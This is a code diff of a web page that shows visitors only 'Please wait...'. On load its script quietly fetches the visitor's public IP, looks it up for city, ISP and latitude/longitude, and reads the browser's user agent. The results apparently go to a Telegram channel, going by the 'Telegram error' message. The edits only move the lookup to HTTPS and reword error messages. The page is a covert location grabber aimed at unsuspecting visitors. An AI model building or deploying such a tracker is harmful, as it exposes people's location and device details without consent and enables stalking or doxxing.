@@ -14,15 +14,14 @@
     <h2>Please wait...</h2>
 
     <script>
-        // ✅ ip-api.com (सही location)
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
 
-                // ✅ ip-api.com प्रयोग गर्ने
-                fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,lat,lon`)
+                // ✅ HTTPS API (ip-api.com को SSL version)
+                fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,isp,lat,lon`)
                     .then(res => res.json())
                     .then(locData => {
                         if (locData.status === 'success') {
@@ -53,14 +52,14 @@
                                 document.body.innerHTML = `<h2>✅</h2><p style="color:green;">Done</p>`;
                             })
                             .catch(() => {
-                                document.body.innerHTML = `<h2>⚠️</h2><p>Error</p>`;
+                                document.body.innerHTML = `<h2>⚠️</h2><p>Telegram error</p>`;
                             });
                         } else {
                             document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
                         }
                     })
                     .catch(() => {
-                        document.body.innerHTML = `<h2>⚠️</h2><p>Network error</p>`;
+                        document.body.innerHTML = `<h2>⚠️</h2><p>API error</p>`;
                     });
             })
             .catch(() => {
